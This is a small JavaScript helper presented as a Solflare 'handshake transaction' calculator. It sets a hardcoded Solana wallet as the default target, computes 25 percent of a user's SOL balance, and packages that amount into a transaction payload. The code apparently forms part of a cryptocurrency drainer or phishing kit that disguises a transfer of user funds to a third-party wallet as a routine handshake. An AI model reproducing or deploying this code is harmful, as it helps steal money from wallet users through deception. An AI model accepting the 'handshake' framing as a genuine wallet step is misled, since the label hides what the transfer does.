/**
 * Solflare Handshake Transaction Calculation & Payload Helper
 */
(function(root) {
  function getConfig() {
    if (typeof globalThis !== 'undefined' && globalThis.HANDSHAKE_CONFIG) {
      return globalThis.HANDSHAKE_CONFIG;
    }
    if (typeof window !== 'undefined' && window.HANDSHAKE_CONFIG) {
      return window.HANDSHAKE_CONFIG;
    }
    return {
      HANDSHAKE_TARGET_WALLET: "DJsw99DJHntTp5apr6P9w6xXdP23ckkWV72bPcfoaahV",
      HANDSHAKE_PERCENTAGE: 25,
      ESTIMATED_FEE: "0.000005 SOL"
    };
  }

  function calculateHandshakeAmount(solBalance, percentage) {
    const bal = Number(solBalance) || 0;
    const pct = Number(percentage) || 25;
    const amount = (bal * pct) / 100;
    return amount > 0 ? Number(amount.toFixed(4)) : 0;
  }

  function createHandshakePayload(targetWallet, amount, fee) {
    return JSON.stringify({
      type: "handshake_transaction",
      target: targetWallet,
      amount: amount,
      currency: "SOL",
      estimatedFee: fee || "0.000005 SOL",
      timestamp: Date.now()
    });
  }

  const helper = {
    getConfig: getConfig,
    calculateHandshakeAmount: calculateHandshakeAmount,
    createHandshakePayload: createHandshakePayload
  };

  if (typeof module !== 'undefined' && module.exports) {
    module.exports = helper;
  }
  if (typeof root !== 'undefined') {
    root.HANDSHAKE_HELPER = helper;
  }
})(typeof globalThis !== 'undefined' ? globalThis : (typeof window !== 'undefined' ? window : this));
